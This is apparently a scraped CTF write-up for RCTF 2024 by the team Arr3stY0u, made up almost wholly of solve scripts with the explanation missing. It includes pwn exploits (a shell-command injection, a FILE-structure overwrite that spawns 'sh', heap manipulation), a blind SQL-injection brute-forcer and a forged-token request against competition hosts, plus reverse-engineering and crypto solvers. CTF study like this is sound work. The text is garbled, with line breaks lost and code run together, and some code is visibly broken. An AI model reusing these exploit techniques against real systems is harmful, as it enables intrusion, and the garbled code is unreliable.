# 2024 RCTF writeup by Arr3stY0u

> 原文: https://www.ctfiot.com/184051.html
> ID: 184051

flag0.png：RCTFflag1.png：{??bflag2.png：a??eflag3.png：b??5flag4.png：c??5flag5.png：4??-flag6.png：0??0flag7.png：-??dflag8.png：7??2flag9.png：5??}

from PIL import Image
def read_and_write_pixels(input_path, output_path): # 打开原始图片 img = Image.open(input_path)
 # 获取图片的宽度和高度 width, height = img.size
 # 创建一个新的图片对象，与原始图片大小和模式相同 new_img = Image.new(img.mode, (width // 2, height))
 # 获取原始图片的像素数据 pixels = img.load()
 # 获取新图片的像素数据 new_pixels = new_img.load()
 # 从图像最左侧开始向右读取像素，每隔一个像素提取一个像素，并从新图片的最左侧开始写入 for x in range(0, width, 2): for y in range(height): pixel = pixels[x, y] # 读取原始图片的像素 new_x = x // 2 # 计算新图片的 x 坐标 new_pixels[new_x, y] = pixel # 将像素写入新图片
 # 保存新图片 new_img.save(output_path)
# 调用函数并传入原始图片路径和输出图片路径read_and_write_pixels("flag1.png", "flag1-1.png")

from PIL import Image
def read_and_write_pixels(input_path, output_path): # 打开原始图片 img = Image.open(input_path)
 # 获取图片的宽度和高度 width, height = img.size
 # 创建一个新的图片对象，与原始图片大小和模式相同 new_img = Image.new(img.mode, (width // 2, height))
 # 获取原始图片的像素数据 pixels = img.load()
 # 获取新图片的像素数据 new_pixels = new_img.load()
 # 从图像最右侧开始向左读取像素，每隔一个像素提取一个像素，并从新图片的最右侧开始写入 for x in range(width - 1, 0, -2): for y in range(height): pixel = pixels[x, y] # 读取原始图片的像素 new_x = width // 2 - 1 - ((width - 1 - x) // 2) # 计算新图片的 x 坐标 new_pixels[new_x, y] = pixel # 将像素写入新图片
 # 保存新图片 new_img.save(output_path)
# 调用函数并传入原始图片路径和输出图片路径read_and_write_pixels("flag1.png", "flag1-2.png")

flag0.png：RCTFflag1.png：{??b | 4、cflag2.png：a??e | 0、fflag3.png：b??5 | e、-flag4.png：c??5 | -、aflag5.png：4??- | a、3flag6.png：0??0 | d、6flag7.png：-??d | 9、3flag8.png：7??2 | 3、2flag9.png：5??} | 0、a

flag3.png：b-e5flag4.png：ca-5flag5.png：43a-flag7.png：-39d

flag0.png：RCTFflag1.png：{c4bflag2.png：af0eflag3.png：b-e5flag4.png：ca-5flag5.png：43a-flag6.png：06d0flag7.png：-39dflag8.png：7232flag9.png：5a0}flag：RCTF{c4baf0eb-e5ca-543a-06d0-39d72325a0}

niuo<SPACE>ybufmefhui<SPACE>kjqillxdjwmi<SPACE>uizebuui<SPACE><RET>dvoo<SPACE><RET>udpn<SPACE>uibuui<SPACE>jqybdm<SPACE>vegeyisi<SPACE><RET>vemeuoll<SPACE>jxysgowodmnkderf<SPACE>dbmzfa<SPACE>hkhkdazi<SPACE><RET>zvjnybufme<SPACE>hkwjdeggma<SPACE><RET>na<SPACE>mimajqueviig<SPACE><RET>kyllda<SPACE>doqisl<SPACE>ba<SPACE><RET>pnynqrpn<SPACE><RET>qrxcxxzimu<SPACE><RET>

niuo ybufmefhui kjqillxdjwmi uizebuui dvoo udpn uibuui jqybdm vegeyisi vemeuoll jxysgowodmnkderf dbmzfa hkhkdazi zvjnybufme hkwjdeggma na mimajqueviig kyllda doqisl ba pnynqrpn qrxcxxzimu

if (r1.j > 3000) { int[] arrayOfInt1; int[] arrayOfInt2; String str2; byte b2; for (arrayOfInt1 = new int[] { 164, 158, 95, 107, 4, 215, 108, 115, 5, 8, 25, 57, 41, 236, 231, 17, 85 }, arrayOfInt2 = new int[] { 246, 221, 11, 45, 127, 148, 45, 36, 70, 73, 78, 8, 98, 141, 140, 112, 40 }, str2 = "", b2 = 0; b2 < arrayOfInt1.length; ) { char c = (char)(arrayOfInt1[b2] ^ arrayOfInt2[b2]); str2 = str2 + str2; b2++; } String str1; byte b1; int[] arrayOfInt3; int[] arrayOfInt4; for (arrayOfInt3 = new int[] { 100, 174, 197, 56 }, arrayOfInt4 = new int[] { 2, 194, 164, 95 }, str1 = "", b1 = 0; b1 < arrayOfInt3.length; ) { char c = (char)(arrayOfInt3[b1] ^ arrayOfInt4[b1]); str1 = str1 + str1; b1++; } r1.d.add(new m(str1, null, str2)); } r1.d.add(new m()); r1.d.add(new m(am[4], null, Integer.toString(r1.j)));

a=[164, 158, 95, 107, 4, 215, 108, 115, 5, 8, 25, 57, 41, 236, 231, 17, 85 ]b=[246, 221, 11, 45, 127, 148, 45, 36, 70, 73, 78, 8, 98, 141, 140, 112, 40]str2 = ''for b2 in range(0,len(a)): str2 += chr(a[b2] ^ b[b2])print(str2)# RCTF{CAWCAW1Kaka}

#!/usr/bin/python3# -*- encoding: utf-8 -*-
from pwncli import *context(arch='amd64', os='linux', log_level='debug')# use script modecli_script()
# get use for obj from giftio: tube = gift['io']elf: ELF = gift['elf']libc: ELF = gift['libc']
sla(b"name:",b'cat${IFS}/flag')
#buysl(b'1')sl(b'2')
sl(b'2')sl(b'1')sl(b'1')sl(b'2')sl(b'2')
ru(b'4294966296')#buysl(b'2')sla(b">>", b'1')sla(b">>", b'1')#learnsla(b">>", b'2')sla(b">>", b'3')#dropsla(b">>", b'2')sla(b">>", b'2')
#buysla(b">>", b'2')sla(b">>", b'1')sla(b">>", b'2')#learnsla(b">>", b'2')sla(b">>", b'3')#dropsla(b">>", b'2')sla(b">>", b'2')
#buysla(b">>", b'2')sla(b">>", b'1')sla(b">>", b'3')#learnsla(b">>", b'2')sla(b">>", b'3')
sla(b">>", b'2')sla(b">>", b'1337')
ru(b'0x')system_addr=int(r(12),16)log_address_ex2(system_addr)
ru(b'0x')code_base=int(r(12),16)-0x4C950log_address_ex2(code_base)
payload=flat({ 0:code_base+0x124FF0, 40:system_addr})
sl(b'2')sl(b'1337')sl(b'2')sl(b'2')sl(b'1')sl(b'1')sl(b'3')ru(b' next visit.')sl(b'3')sl(payload)
ia()

#!/usr/bin/python3# -*- encoding: utf-8 -*-
from pwncli import *
context(arch='amd64', os='linux', log_level='debug')# use script mode# cli_script()
# get use for obj from gift#io = gift['io'] = process("wasmtime run --allow-precompiled --disable-cache --env FLAG=$FLAG ./minesweeper",shell=True)io = gift['io'] = remote("123.60.161.30", 10088)# elf: ELF = gift['elf']# libc: ELF = gift['libc']# pause()sla(b'Name', b'a' * 0x10)
sla(b'mark):', b'0 0 U')sla(b'mark):', b'0 0 u')
payload = b'yn0n' * 15 * 16sa(b':', payload)
sla(b':', b'y')sl(b'xb0')sla(b':', b'y')sl(b'x14')sla(b':', b'y')sl(b'x01')
for i in range(13): sla(b':', b'y') sl(b'x00')

ia()

#!/usr/bin/python3# -*- encoding: utf-8 -*-import base64
from pwncli import *context(arch='amd64', os='linux', log_level='debug')# use script modecli_script()
# get use for obj from giftio: tube = gift['io']elf: ELF = gift['elf']libc: ELF = gift['libc']

def add_feedback(chooice,lent,cont): sla(b"> ",b'2') sla(b"> ",str(chooice)) sla(b"How many words do you want to feedback?",str(lent)) sla(b"Please input your feedback:",cont)
def show_feedback(chooice): sla(b"> ", b'3') sla(b"> ", str(chooice))
def delete_feedback(chooice): sla(b"> ", b'4') sla(b"> ", str(chooice))
def edit_feedback(chooice,cont): sla(b"> ", b'5') sla(b"> ", str(chooice)) sla(b"Please input your feedback:", cont)

def vul(cont): sla(b"> ", b'1') sa(b"Your webp format image in base64:",cont)
add_feedback(1,0x4180,b'stas')add_feedback(2,0x20,b'stas')delete_feedback(2)add_feedback(2,0x10,b'stas')
delete_feedback(1)add_feedback(1,0x4180,b'stas')show_feedback(1)set_current_libc_base_and_log(recv_current_libc_addr(),0x21ace0)delete_feedback(1)delete_feedback(2)add_feedback(2,0x20,b'stas')add_feedback(1,0x20,b'stas')
#overwrite sizef=open("bad.webp","rb")data=f.read()payload=base64.b64encode(data)vul(payload)
show_feedback(2)ru(p64_ex(0x21))heap_base=u64_ex(r(6))&(~0xfff)log_address_ex2(heap_base)
payload=p64_ex(0x21)*6+p64_ex(libc.sym['_IO_2_1_stderr_'])+p64_ex(0x1000)edit_feedback(2,payload)

f=FileStructure()f.flags=u64_ex(" sh;")f._IO_read_ptr =0f._IO_read_end=0f._IO_read_base=libc.sym['system']f._IO_write_base=0f._IO_write_ptr=1

f._lock=libc.symbols['_IO_2_1_stderr_']-0x10f._codecvt=libc.symbols['_IO_2_1_stderr_']
f.chain=libc.sym['system']f._wide_data=libc.symbols['_IO_2_1_stderr_']-0x48
f.vtable=p64_ex(libc.symbols['_IO_wfile_jumps'])

edit_feedback(1,bytes(f))

ia()

import requestsimport string
payload = "'||love_key regexp binary '{}';-- "flag = 'RCTF{THE_FIRST_STEP_IS_TO_GET_TO_KNOW'for i in range(1,20): for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ_': print(payload.format(flag+c)) r = requests.post('http://1.94.13.174:10088/key1',data={'key1[]':payload.format(flag+c)}) # print(r.text) if 'success' in r.text: flag+=c print(flag) break

> data='{"love_time":{"a":1},"have_lovers":true}''{"love_time":{"a":1},"have_lovers":true}'> const crypto = require("crypto");undefined> > const secret = crypto.randomBytes(128);undefined> const hash = (data) => crypto.createHash("sha256").update(data).digest("hex");undefined> const userinfo = JSON.parse(data);undefined> const saltedSecret =... parseInt(Buffer.from(secret).readBigUInt64BE()) +... parseInt(userinfo.love_time);undefined> saltedSecretNaN> hash(`${data}:${saltedSecret}`)'568f9bfca86a2a8cc880deed88bd80d86a728fa5062a401a2b79262a6340e738'

POST /checklove_token=eyJsb3ZlX3RpbWUiOnsiYSI6MX0sImhhdmVfbG92ZXJzIjp0cnVlfQ%3D%3D.568f9bfca86a2a8cc880deed88bd80d86a728fa5062a401a2b79262a6340e738

from Crypto.Cipher import AESfrom Crypto.Util.Padding import padfrom Crypto.Util.Padding import unpadimport base64,timeimport requests
class AES_C(object): def __init__(self): self.key=b'88b4dbc541cd57f2d55398e9be3e61ae' self.iv=b'41cd57f2d55398e9' self.cipher=AES.new(self.key,AES.MODE_CBC,self.iv)
 def encrypt(self,text): padtext=pad(text,16,style='pkcs7') cipherText=self.cipher.encrypt(padtext) # print(padtext) # print(cipherText) return base64.b64encode(cipherText)
 def decrypt(self,b): decrypter=AES.new(self.key,AES.MODE_CBC,self.iv) cipherText = base64.b64decode(b) plaintext=decrypter.decrypt(cipherText) unpadtext=unpad(plaintext,16,'pkcs7') # print(plaintext) # print(unpadtext) return unpadtext
s = requests.Session()i = 1while i<=501: aes_c = AES_C() rangeNum = str((i+1)*(i+1)).encode() print(rangeNum) range = aes_c.encrypt(rangeNum) try: r = s.post("http://124.71.164.28:10088/final/game.php",data={ "action":"3wrg4Ich1RsKFUUPmU0vlw==", "rangeNum":range }) print(r.json()['data']) time.sleep(2) r = s.post("http://124.71.164.28:10088/final/game.php",data={ "action":"s03/Zr+K7nTxLc2aiHJQcg==", "pos":r.json()['data'] }) print(r.text) i += 1 except: print('error') continue
r = s.post("http://124.71.164.28:10088/final/game.php",data={ "action":"IMYZakV42qGIPRWdg/WfFg=="})print(r.text)

else if($action === "checkImage"){ try { $upload_image = file_get_contents($_FILES["image"]["tmp_name"]); echo getimagesize($upload_image); }catch (Exception $e){ echo "something wrong"; }
}

elif self.verb == Verb.POST: files = {'image':('/flag.txt',merged_data['image'])} if self.json_input: requ = self.session.post(self.target, json=merged_data) else: requ = self.session.post(self.target, data={"action":"xEt6B2i+YJdcrJ/RG3Ie4Q=="},files=files) return requ

from Crypto.Util.number import long_to_bytesimport claripy
inp = [claripy.BVS(f"inp_{i}", 64) for i in range(3)]
v23 = inp[0]v24 = inp[1]v25 = inp[2]v20 = (v24 & v23)v19 = ((v24 & v23 | v25 & v23) + 65670)v18 = ((v25 & v23 ^ v25 & v24) - 1131796)v17 = (v24 & v23 ^ v25 & v23)
s = claripy.Solver()s.add((v23 ^ (v20 & ~v18 | v20 & ~v19 | v17 & v19 | v25 & v23 & ~v18)) == 0x400010000622000)s.add((v18 ^ (v19 - v20)) == 0x2100A0203EFBB8B)s.add((v17 ^ v19 ^ v20) == 0x4083102108E)s.add((v19 ^ v17) - v18 == 0x1551566F3C6485ED)s.add((v18 ^ v19 ^ v25 & v24) == 0x40836ECAB9A)s.add((v17 ^ v20) - v18 == 0x3E51566F3C718563)s.add((v23 - v24) == 0x1AEFF6FDFC121BF1)s.add((v25 + v24 + v23) % 10 == 8)
for i in range(len(inp)): for j in range(8): s.add((inp[i] >> (j*8)) & 0xff <= 125) s.add((inp[i] >> (j*8)) & 0xff >= 65)
print(s.check_satisfiability())

def rev(s): inp = "abcdefghijklmnopqrstuvwx" inp_tree2_pos = "qopmukwlfcrveisaxbtdjgnh" flag = [0]*len(s) for i in range(len(s)): flag[inp.index(inp_tree2_pos[i])] = ord(s[i]) return bytes(flag)

for i in s.batch_eval(inp, 2000): s = "" for ii in i: s += (long_to_bytes(ii)[::-1].decode()) res = rev(s).decode() if res.startswith("RCTF{") and res.endswith("}"): print(res)

from Crypto.Util.number import *import gmpy2from hexdump import hexdump
n = bytes_to_long(bytes.fromhex('3F68386D7C52FBB3DFE3CCACC3DCFD1BA66CAAC7A5FC040F7CC0E55BF1ABEB92330BA492AC81084791CBD70B97A545A1CF9D0CC87E159C286964B906955C798830D36F18DCB003B8B477CE3E5AB1576C5484A6F6D1D79718BDA50BDC3C1A5910DFE6F0DC90080B3F2913C2419FDA4691ED6D7C2A3E7CF92C3FCD60D5560368E901')[::-1])e = bytes_to_long(bytes.fromhex('C5B38CCE2D27139C5B552C93F8FE3D6CFB2B03F70E27BC80BBD178C991E910DB553A6329636B74B4106FC209CBFB6B00434F03B2D9B7EE0CE2F816D14F68BEAE891CA3AE6C1F13772F1C9D2F4854BB9AD81250EE1E1D3A4039144710814911A24B1A9D59ED9F04A256632D7ECED4AA3FBBB962CDB9047FDF83A904F6D6892D24')[::-1])# boneh_durfeed = 24148649361037793876488182229470214987409054478429360732252558238236696170653
print(f'{n=}')print(f'{e=}')

def a_xor(buf, key, start, size): for i in range(size): buf[start+i] ^= key
def a_sub(buf, key, start, size): for i in range(size): buf[start+i] = (buf[start+i]-key)&0xFF
def a_add(buf, key, start, size): for i in range(size): buf[start+i] = (buf[start+i]+key)&0xFF
buf = bytearray.fromhex('45 AB BD BE AF AB 46 46 27 5D 88 99 9E 71 7E 98 00 92 97 6A 23 7F 7B 57 CC 6D 64 78 E0 61')
a_xor(buf, 8, 0, len(buf))a_xor(buf, 0x80, 0x1C, 1)a_add(buf, 0xBE, 0xF, 5)a_xor(buf, 8, 0, len(buf))a_xor(buf, 0x44, 0x14, 1)a_xor(buf, 0x80, 0x18, 1)a_sub(buf, 0xEF, 0xD, 6)a_xor(buf, 0x80, 0x10, 1)a_xor(buf, 0x44, 0x13, 1)a_add(buf, 0xBE, 10, 5)a_sub(buf, 0xEF, 0x5, 6)a_add(buf, 0xBE, 1, 5)a_xor(buf, 8, 0, len(buf))
hexdump(buf)
print(buf)
c = bytes_to_long(buf[::-1])m = pow(c, d, n)print(long_to_bytes(m)[::-1].hex())
# ComputerHKEY_CURRENT_USERSOFTWAREDrAkira# MyKeys 962d82971fb182b70e3a6d493a58133a779aa22947cf8d4b0c69b81846ed24daf4341e21f1ecfdf01687a1ff0dba88af2e331ec4c0d26a5e3d49a94b50ec9c11d484db1bae528a4ec1112b604e567b7e39badec7742097e438f890027050897a667de1418d1e3b48ff83087c61193b56b07b8b03d5503d8205a096a1e1136533
# RCTF{Dragon_Nest_Raja_And_Me}

from pwn import *import numpy as np

exe = './2048'# context.terminal = ['wt.exe', 'wsl.exe', 'bash', '-c']context.binary = ELF(exe, False)binary: ELF = context.binary# libc: ELF = ELF('./libc.so.6', False)
REMOTE = args.REMOTE or 1if REMOTE: p = remote('1.94.104.104', 10088)else: p = process(exe)sd, sa, sl, sla = p.send, p.sendafter, p.sendline, p.sendlineafterrn, rl, ru, ia = p.recvn, p.recvline, p.recvuntil, p.interactive

def parse_board(board_string): lines = board_string.strip().split("n") board = [] for line in lines: if "|" in line and '·' in line or any(char.isdigit() for char in line): row = [] # Skip the first and last empty splits cells = line.split("|")[1:-1] for cell in cells: cell = cell.strip() if cell == "·": row.append(0) elif cell.isdigit(): row.append(int(cell)) else: row.append(0) if row: board.append(row) return board

def move_left(board): new_board = [] for row in board: new_row = [num for num in row if num != 0] for i in range(len(new_row) - 1): if new_row[i] == new_row[i + 1]: new_row[i] *= 2 new_row[i + 1] = 0 new_row = [num for num in new_row if num != 0] new_row += [0] * (len(row) - len(new_row)) new_board.append(new_row) return np.array(new_board)

def move_right(board): return np.array([row[::-1] for row in move_left(board[::-1])])

def move_up(board): return move_left(board.T).T

def move_down(board): return move_right(board.T).T

def heuristic_score(board): empty_cells = len(np.where(board == 0)[0]) max_tile = np.max(board) return empty_cells + np.log2(max_tile)

def get_best_move(board): moves = { 'a': move_left(board), 'd': move_right(board), 'w': move_up(board), 's': move_down(board) } max_score = -1 best_move = None for move, new_board in moves.items(): if not np.array_equal(new_board, board): score = heuristic_score(new_board) if score > max_score: max_score = score best_move = move return best_move

def get_char(arr): board = np.array(arr) best_move = get_best_move(board) return best_move
def check_around(board, x, y, dx, dy): x1 = x+dx y1 = y+dy if x1 < 0 or x1 > 3: return False if y1 < 0 or y1 > 3: return False return board[y][x] == board[y1][x1]
def ready2win(board): for y in range(4): for x in range(4): if board[y][x] == 1024: if check_around(board, x, y, -1, 0): return True, 'd' if check_around(board, x, y, +1, 0): return True, 'd' if check_around(board, x, y, 0, -1): return True, 's' if check_around(board, x, y, 0, +1): return True, 's' return False, None

def read_raw_board(): r = b'' for i in range(4): rl() rl() rl() r += rl() return r.decode()

def add_game(): sla(b"3. exitn", b"1") sla(b"to win: ", b"1") sla(b"or r n", b'S')

for i in range(500): print(f'radding', i, end='') add_game()
for i in range(11): print('iii', i) sla(b"3. exitn", b"1") sla(b"to win: ", b"1") for j in range(50): print('JJJJJJ', j) msg = rl() # print(msg) if b'OVER' in msg: print('GG') exit(0) if b'win' in msg: exit(0) r = read_raw_board() # print(r) tmp = [] res = parse_board(r) for k in res: tmp.append(k) move = get_char(tmp) # print('move:', move) sla(b"or r n", move.encode()) ru(b"or r n") sla(b"or r n", b'S')
# ia()ru(b'your current score: ')score = int(ru(b'n', True))print(f'{score=}')sla(b"3. exitn", b"1")sla(b"to win: ", str(score).encode())
while True: msg = rl() print(msg) if b'OVER' in msg: print('GG') exit(0) if b'win' in msg: exit(0) r = read_raw_board() print(r) tmp = [] res = parse_board(r) for i in res: tmp.append(i) _ready2win, _move = ready2win(tmp) print(f'{_ready2win=}') if _ready2win: break move = get_char(tmp) print('move:', move) sla(b"or r n", move.encode()) ru(b"or r n")
if _ready2win: sla(b"or r n", b'S')# 511# input('input >>> ')# context.log_level = 'DEBUG'while True: sla(b"3. exitn", b"2") sla(b"load index: ", b"511") sla(b"or M(Menu) n", _move.encode()) ru(b"or M(Menu) n") msg = rl() score = int(msg[5:-5]) print(msg) if score > 1000000: break res = ru(b"you win!n", timeout=5) # print(res) add_game()
sla(b"3. exitn", b"3")ia()

from Crypto.Cipher.ARC4 import ARC4Cipher
enc_flag = bytes([0x80, 0x05, 0xE3, 0x2F, 0x18, 0x2F, 0xC5, 0x8C, 0x25, 0x70, 0xBC, 0x05, 0x1C, 0x4F, 0xF2, 0x02, 0xE5, 0x3E, 0x02, 0x2F, 0xE5, 0x11, 0xA3, 0xC0, 0x00])
key = bytes.fromhex('4B 8A A9 E1 99 28 4D 4B 22 B7 BD 8D 5A 49 35 00 63 B6 C5 6B 61 94 A5 03 06')enc_flag = [enc_flag[i] ^ key[i] for i in range(25)]
for i in range(25): enc_flag[i] = ((enc_flag[i]>>6)|(enc_flag[i]<<2))&0xFF
enc_flag = [x ^ 0x7D for x in enc_flag]print(bytes(enc_flag[:-1])+b'}')
# RCTF{a_baby_debug_bloker}

import check_secret
"""check_secret.map'add':<built-in function algorithm1>'sub':<built-in function algorithm2>'mul':<built-in function algorithm3>'div':<built-in function algorithm4>'mod':<built-in function algorithm5>'rsl':<built-in function algorithm6>'rsr':<built-in function algorithm7>'xor':<built-in function algorithm8>"""

def hook_add(a, b): res = check_secret.algorithm1(a, b) print(f'0x{res:08x} = 0x{a:08x} + 0x{b:08x}') return res

def hook_sub(a, b): res = check_secret.algorithm2(a, b) print(f'0x{res:08x} = 0x{a:08x} - 0x{b:08x}') return res

def hook_mul(a, b): res = check_secret.algorithm3(a, b) print(f'0x{res:08x} = 0x{a:08x} * 0x{b:08x}') return res

def hook_div(a, b): res = check_secret.algorithm4(a, b) print(f'0x{res:08x} = 0x{a:08x} / 0x{b:08x}') return res

def hook_mod(a, b): res = check_secret.algorithm5(a, b) print(f'0x{res:08x} = 0x{a:08x} % 0x{b:08x}') return res

def hook_rsl(a, b): res = check_secret.algorithm6(a, b) print(f'0x{res:08x} = 0x{a:08x} << 0x{b:08x}') return res

def hook_rsr(a, b): res = check_secret.algorithm7(a, b) print(f'0x{res:08x} = 0x{a:08x} >> 0x{b:08x}') return res

def hook_xor(a, b): res = check_secret.algorithm8(a, b) print(f'0x{res:08x} = 0x{a:08x} ^ 0x{b:08x}') return res

check_secret.map['add'] = hook_addcheck_secret.map['sub'] = hook_subcheck_secret.map['mul'] = hook_mulcheck_secret.map['div'] = hook_divcheck_secret.map['mod'] = hook_modcheck_secret.map['rsl'] = hook_rslcheck_secret.map['rsr'] = hook_rsrcheck_secret.map['xor'] = hook_xor
"""enc:[1386864498, 2877138732, 1628978326, 881564191, 1437614165, 4227562200, 1606883458, 3679355295][KEY2] haha:[1272471749, 2262110437, 697301573, 1088211398]map:{'add': <function hook_add at 0x7f4f934401f0>, 'sub': <function hook_sub at 0x7f4f934415a0>, 'mul': <function hook_mul at 0x7f4f93441bd0>, 'div': <function hook_div at 0x7f4f93440d30>, 'mod': <function hook_mod at 0x7f4f934413f0>, 'rsl': <function hook_rsl at 0x7f4f934412d0>, 'rsr': <function hook_rsr at 0x7f4f934411b0>, 'xor': <function hook_xor at 0x7f4f93441090>}sbox:[12, 17, 10, 6, 5, 27, 31, 15, 11, 8, 13, 21, 24, 1, 26, 22, 9, 16, 18, 25, 29, 19, 0, 3, 7, 14, 30, 4, 23, 2, 28, 20][KEY1] xixi:[3540658286, 3391361277, 1321275334, 3918321625]"""
# check_secret.sbox = list(range(32))# print(check_secret.check('00001111222233334444555566667777'))print(check_secret.encrypt([0x36363636, 0x37373737], check_secret.xixi))

from ctypes import c_uint32import struct
key1 = [3540658286, 3391361277, 1321275334, 3918321625]key2 = [1272471749, 2262110437, 697301573, 1088211398]delta = 0x12345678
def tea_enc(v, key): y, z = c_uint32(v[0]), c_uint32(v[1]) _sum = c_uint32(0) for i in range(32): y.value += ((z.value<<4) + key[0]) ^ (z.value + _sum.value) ^ ((z.value>>5) + key[1]) _sum.value += delta z.value += ((y.value<<4) + key[2]) ^ (y.value + _sum.value) ^ ((y.value>>5) + key[3]) # print(f'r:{i} 0x{y.value:08x} 0x{z.value:08x}') return [y.value, z.value]
def tea_dec(v, key): y, z = c_uint32(v[0]), c_uint32(v[1]) _sum = c_uint32(delta*32) for i in range(32): z.value -= ((y.value<<4) + key[2]) ^ (y.value + _sum.value) ^ ((y.value>>5) + key[3]) _sum.value -= delta y.value -= ((z.value<<4) + key[0]) ^ (z.value + _sum.value) ^ ((z.value>>5) + key[1]) # print(f'r:{i} 0x{y.value:08x} 0x{z.value:08x}') return [y.value, z.value]
enc = [1386864498, 2877138732, 1628978326, 881564191, 1437614165, 4227562200, 1606883458, 3679355295]pt = b''for i in range(0, len(enc), 2): v0, v1 = tea_dec(enc[i:i+2], key2) v0, v1 = tea_dec([v0, v1], key1) pt += struct.pack('<2I', v0, v1)sbox = [12, 17, 10, 6, 5, 27, 31, 15, 11, 8, 13, 21, 24, 1, 26, 22, 9, 16, 18, 25, 29, 19, 0, 3, 7, 14, 30, 4, 23, 2, 28, 20]_pt = b''for i in range(len(pt)): _pt += bytes([pt[sbox.index(i)]])print(_pt)

from Crypto.Cipher.ARC4 import ARC4Cipherfrom hashlib import md5
rc4 = ARC4Cipher(b'RCTF_2024_fighting')xorkey = rc4.encrypt(b'x00'*36)
data = bytearray.fromhex('31 11 B9 FD D4 41 0C AD 59 0A A2 5C F9 47 D8 0D 4C C8 60 80 CF E1 87 F9 67 22 86 05 EB 2A EB E6 A2 B4 EE 53')for i in reversed(range(len(data))): data[i] = data[i] ^ data[(i-1)%len(data)] ^ xorkey[i%len(xorkey)]print(data)
T = b'0123456789abcdefghijklmnopqrstuvwxyz'S = b''
data1 = bytearray.fromhex(''' 73 16 6f 0e 7e 0a 6e 18 28 43 2c 4e 29 11 6b 06 6f 05 31 03 65 09 71 04 77 05 30 01 69 5f 2e 1d 24 47 29 1e ''')
for i in range(0x100): _data = data1.copy() key = i for i in range(len(data1)): _key = _data[i] _data[i] ^= key key = _key if bytes(sorted(_data)) == T: print(_data) S = b'weyaptdv0kobg8zmij42flxusr51h6q39cn7' break
def inv_sbox(buf): out = bytearray(len(buf)) for i in range(len(S)): out[T.index(S[i])] = buf[i] return out

for i in range(0x100): _data = data.copy() key = i for i in range(len(data)): _key = _data[i] _data[i] ^= key key = _key _data = inv_sbox(_data) if md5(_data).hexdigest() == 'c67186f87422544aaac6844eda5c25e8': print(_data)

b = bytearray(open('./re2', 'rb').read())
for i in range(0x2188, 0xA2348): if b[i] == 0x2F and b[i+1] and b[i+2] == 0x00: print(hex(i)) for j in range(b[i+1]): b[3+i+j] = 0x96
open('./re2_patch', 'wb').write(b)

gimli::Operation::Skip { target } => { println!("// Skip {}", target); writeln!(w, "// Skip {}", target)?; } gimli::Operation::Bra { target } => { let val1 = stack.pop().unwrap(); println!("// Bra {} {}", target, val1); writeln!(w, "// Bra {} {}", target, val1)?; } gimli::Operation::Nop { } => { }

console.log('script loaded')
var base = Module.findBaseAddress("libgcc_s.so.1")console.log('base', base);
var count1 = 0;var count2 = 0;
// Interceptor.attach(base.add(0x16111), {// onEnter: function (args) {// console.log('SHL', count1, this.context.r9, this.context.rcx);// count1 += 1;// }// });
function hook() { Interceptor.attach(base.add(0x16100), { onEnter: function (args) { let v0 = BigInt(ptr(this.context.r9).toString(10)) let v1 = BigInt(ptr(this.context.r8).toString(10)) let v2 = ptr((v0+v1).toString(10)); if (this.context.r8.equals(ptr(0x9E3779B9))) { console.log(' ADD', v2, '=', this.context.r9, '+', this.context.r8); } } }); // Interceptor.attach(base.add(0x16148), { // onEnter: function (args) { // let v0 = BigInt(ptr(this.context.r9).toString(10)) // let v1 = BigInt(ptr(this.context.r8).toString(10))
 // let v2 = ptr((v0^v1).toString(10)); // console.log(' XOR', v2, '=', this.context.r9, '^', this.context.r8); // } // });}

// hook();Interceptor.attach(base.add(0x16132), { onEnter: function (args) { // if (count2 == 120) { // hook(); // } if (count2 > 120) { console.log('SHR', count2, this.context.r9, this.context.rcx); } count2 += 1; }});

from ctypes import c_uint64import struct
key1 = [11, 22, 33, 44]delta = 0x9E3779B9
def tea_enc(v, key): y, z = c_uint64(v[0]), c_uint64(v[1]) _sum = c_uint64(0) for i in range(32): _sum.value += delta if i >= 30: _sum.value += 1 #print(f'round:{i} _SUM 0x{_sum.value:08X} z 0x{z.value:08x}') print(f'round:{i} z 0x{z.value:08x}') y.value += ((z.value<<4) + key[0]) ^ (z.value + _sum.value) ^ ((z.value>>5) + key[1]) print(f'round:{i} y 0x{y.value:08x}') z.value += ((y.value<<4) + key[2]) ^ (y.value + _sum.value) ^ ((y.value>>5) + key[3]) # print(f'round:{i} 0x{y.value:08x} 0x{z.value:08x}') return [y.value, z.value]
def tea_dec(v, key): y, z = c_uint64(v[0]), c_uint64(v[1]) _sum = c_uint64(delta*32+2) for i in range(32): z.value -= ((y.value<<4) + key[2]) ^ (y.value + _sum.value) ^ ((y.value>>5) + key[3]) y.value -= ((z.value<<4) + key[0]) ^ (z.value + _sum.value) ^ ((z.value>>5) + key[1]) if i < 2: _sum.value -= 1 _sum.value -= delta # print(f'round:{i} 0x{y.value:08x} 0x{z.value:08x}') return [y.value, z.value]

# -0xad48dd59067c4282# -0x323f2d5a909af1a6# 0x3030303030303030# 0x3131313131313131v0, v1 = struct.unpack('<2Q', b'0000000000000000')v0, v1 = tea_enc([v0, v1], key1)print(f'0x{v0:016x} 0x{v1:016x}')

v0, v1 = tea_dec([-0xad48dd59067c4282 & (2**64-1), -0x323f2d5a909af1a6 & (2**64-1)], key1)print(f'0x{v0:016x} 0x{v1:016x}')
print(struct.pack('<2Q', v0, v1))# v91261+v92077+0xdf880ab397173428, v92077+0x323f2d5a909af1a6# print(f'0x{c_uint64((v0+v1)).value:016x}')# v0, v1 = tea_dec([-0xad48dd59067c4282 & (2**64-1), -0x323f2d5a909af1a6 & (2**64-1)], key1)# print(f'0x{v0:016x} 0x{v1:016x}')
# 0000000000000000

from pwn import *import stringimport hashlib#context.log_level = 'debug'from sage.all_cmdline import * import randomfrom hashlib import sha1from gmpy2 import *from Crypto.Util.number import *r = remote('121.37.182.7', 10089)se = lambda data :r.send(data) sa = lambda delim,data :r.sendafter(delim, data)sl = lambda data :r.sendline(data)sla = lambda delim,data :r.sendlineafter(delim, data)sea = lambda delim,data :r.sendafter(delim, data)rc = lambda numb=4096 :r.recv(numb)rl = lambda :r.recvline()ru = lambda delims :r.recvuntil(delims)uu32 = lambda data :u32(data.ljust(4, ' '))uu64 = lambda data :u64(data.ljust(8, ' '))info_addr = lambda tag, addr :r.info(tag + ': {:#x}'.format(addr))

def flatter(M): # compile https://github.com/keeganryan/flatter and put it in $PATH z = "[[" + "]n[".join(" ".join(map(str, row)) for row in M) + "]]" ret = check_output(["flatter"], input=z.encode()) return matrix(M.nrows(), M.ncols(), map(int, findall(b"-?\d+", ret)))

